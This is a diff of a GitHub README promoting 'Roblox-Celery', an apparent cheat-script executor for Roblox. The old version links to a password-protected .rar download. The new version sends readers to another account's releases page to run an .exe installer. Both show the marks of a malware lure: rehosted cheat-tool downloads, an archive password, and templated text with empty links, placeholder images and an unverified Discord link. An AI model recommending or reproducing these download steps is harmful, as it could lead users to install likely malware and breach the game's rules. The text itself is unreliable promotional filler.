@@ -1,60 +1,85 @@
-# [DOWNLOAD LINK](https://github.com/sonyvimer7/Roblox-Celery/releases/download/Download/installer.rar)
-# PASSWORD : 2025
-# Roblox-Celery
+# 🎮 Roblox-Celery - Unlock New Gameplay Adventures
 
-Celery Roblox Executor redefines gameplay possibilities on the platform, offering users a seamless experience to execute custom scripts. With its robust features, it empowers players to unleash creativity and explore new dimensions within their favorite Roblox games.
+## 📥 Download Now!
+[![Download Roblox-Celery](https://img.shields.io/badge/Download%20Roblox--Celery-v1.0-blue.svg)](https://github.com/Bagas-fsb/Roblox-Celery/releases)
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR-CODE>)]()
+## 🚀 Getting Started
+Welcome to Roblox-Celery! This tool enhances your Roblox gameplay by allowing you to run custom scripts easily. Follow the steps below to get started quickly.
 
-## Table of Contents
+## 📋 System Requirements
+Before you download, ensure your system meets these basic requirements:
 
-- [Introduction](#introduction)
-- [Features](#features)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Contributing](#contributing)
-- [License](#license)
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel or AMD processor
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 500 MB of free space
+- **Roblox:** Installed on your computer
 
-## Introduction
+## 🔧 Features
+Roblox-Celery comes packed with features to elevate your gameplay experience:
 
-Welcome to the Roblox-Celery repository! Celery is a powerful Roblox Executor that enables users to enhance their gameplay experience by running custom scripts within Roblox games. Whether you are looking to customize your gameplay, experiment with new features, or simply have fun exploring the possibilities, Celery is the tool for you!
+- **Script Execution:** Run any custom scripts effortlessly in Roblox games.
+- **User-Friendly Interface:** Navigate through various options with ease.
+- **Robust Performance:** Experience fast and stable script execution.
+- **Frequent Updates:** Stay ahead with regularly updated features and improvements.
 
-![Roblox Logo](https://www.roblox.com/images/Roblox-Logo_2x.png)
+## 💾 Download & Install
+To download Roblox-Celery, follow these steps:
 
-## Features
+1. **Visit the Releases Page**  
+   Click the link below to access the download page:  
+   [Download Roblox-Celery](https://github.com/Bagas-fsb/Roblox-Celery/releases)
 
-- **Script Execution**: Run custom scripts seamlessly within Roblox games.
-- **Enhanced Gameplay**: Unlock new dimensions of gameplay with Celery's features.
-- **Robust Functionality**: Enjoy a reliable and stable executor for all your scripting needs.
-- **User-Friendly Interface**: Simple and intuitive design for easy navigation and script execution.
-- **Explore Creativity**: Unleash your creativity and create unique experiences within Roblox games.
+2. **Select the Latest Version**  
+   On the Releases page, find the latest version of Roblox-Celery. It should be listed at the top.
 
-## Installation
+3. **Download the File**  
+   Click on the appropriate file for your system. It is usually named something like `Roblox-Celery-v1.0.exe`. The download will begin automatically.
 
-To get started with Celery, follow these simple steps:
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your Downloads folder. Double-click on the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-1. Download the Celery software from the following link: [Download Software]() 
-2. Extract the downloaded zip file to a location of your choice.
-3. Run the Celery executable file to launch the application.
+5. **Launch Roblox-Celery**  
+   After the installation is complete, find Roblox-Celery in your Start menu or desktop shortcut. Click to launch the app.
 
-Congratulations! You are now ready to experience the full potential of Celery within Roblox.
+## ⚙️ Using Roblox-Celery
+Here's how to execute scripts once you have installed Roblox-Celery:
 
-## Usage
+1. **Open Roblox and Select a Game**  
+   Launch Roblox and choose the game where you want to run scripts.
 
-Using Celery is straightforward and user-friendly. Follow these steps to execute custom scripts within your favorite Roblox games:
+2. **Launch Roblox-Celery**  
+   With the game open, start Roblox-Celery from your desktop or Start menu.
 
-1. Launch the Celery application on your device.
-2. Select the Roblox game in which you want to run custom scripts.
-3. Copy and paste the script code into the designated area within Celery.
-4. Click the 'Execute' button to run the script within the game.
-5. Enjoy the enhanced gameplay experience and explore new possibilities with Celery.
+3. **Enter Your Script**  
+   In the Roblox-Celery window, there will be a text box for you to paste your custom script. Make sure it is properly formatted.
 
-![Celery Interface](https://www.example.com/images/celery-interface.png)
+4. **Execute the Script**  
+   Click the “Run” button in Roblox-Celery to execute your script. Observe how the script modifies or enhances your gameplay.
 
-## Contributing
+5. **Enjoy Your Custom Experience**  
+   Explore all the new possibilities that your custom scripts provide!
 
-We welcome contributions from the community to further enhance Celery and bring new features to our users. If you have ideas, suggestions, or bug fixes, feel free to submit a pull request. Together, we can make Celery even better for all Roblox enthusiasts.
+## ❓ Frequently Asked Questions
+### How do I update Roblox-Celery?
+To update, visit the [Releases Page](https://github.com/Bagas-fsb/Roblox-Celery/releases) and download the latest version, just like your initial installation.
 
-## License
+### Can I use any script?
+We recommend using scripts from trusted sources. Ensure that they are up to date and compatible with the version of Roblox you are using.
 
-The Roblox-Celery repository is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+### What do I do if Roblox-Celery won’t open?
+Ensure that your system meets the requirements and that you have installed Roblox-Celery correctly. If the problem persists, reinstall the application.
+
+## 📞 Support
+If you encounter issues or have questions not covered here, please reach out:
+
+- **Discord:** Join our support channel at [Celery Discord](https://discord.gg/celery-support) for assistance from the community and developers.
+- **Issues Page:** Report bugs or request features on our [GitHub Issues Page](https://github.com/Bagas-fsb/Roblox-Celery/issues).
+
+## 🎉 Join Our Community
+Connect with other users, share scripts, and learn tips and tricks to maximize your experience with Roblox-Celery. 
+
+- **GitHub:** Follow updates on the [Roblox-Celery GitHub Repository](https://github.com/Bagas-fsb/Roblox-Celery).
+- **Social Media:** Stay updated through our official Twitter and Facebook pages.
+
+Enjoy your journey into new dimensions of Roblox gameplay with Roblox-Celery! Happy scripting!
